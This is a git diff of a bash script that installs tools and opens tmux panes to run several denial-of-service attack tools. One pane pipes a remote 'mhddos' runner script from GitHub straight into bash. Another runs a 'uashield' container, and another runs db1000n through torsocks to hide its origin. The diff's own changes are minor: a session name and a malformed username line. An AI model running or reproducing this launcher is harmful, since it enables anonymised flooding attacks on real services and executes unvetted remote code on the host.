@@ -1,4 +1,6 @@
 #!/bin/bash
+username=echo `whoami`
+
 sudo apt-get update -y
 sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
@@ -15,11 +17,11 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
 fi
 rm *.tar.gz *.deb
 
-tmux new-session -s multiddos -d 'gotop -asc solarized'
+tmux new-session -s $username -d 'gotop -asc solarized'
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
 tmux split-window -v 'torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
-#tmux -2 attach-session -d
-tmux a -t multiddos
+tmux -2 attach-session -d
+#tmux a -t multiddos
